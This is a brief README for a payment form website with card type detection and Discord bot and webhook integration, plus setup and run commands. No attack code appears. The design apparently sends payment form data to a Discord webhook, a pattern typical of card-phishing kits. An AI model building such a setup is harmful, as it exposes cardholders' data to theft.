# Payment Form Website

A secure payment form website with Discord integration.

## Features
- Modern UI design
- Card type detection
- Form validation
- Discord webhook integration
- Mobile responsive

## Setup Instructions

1. Clone this repository
2. Install required Python packages:
```bash
pip install discord.py flask flask-cors requests
```

3. Update the Discord bot token and webhook URL in `discord_bot.py`

4. Start the Discord bot:
```bash
python discord_bot.py
```

5. Start the website server:
```bash
python -m http.server 5500
```

6. Access the website at: `http://127.0.0.1:5500/index.html`

## Discord Bot Commands
- `!start` - Get started with the bot 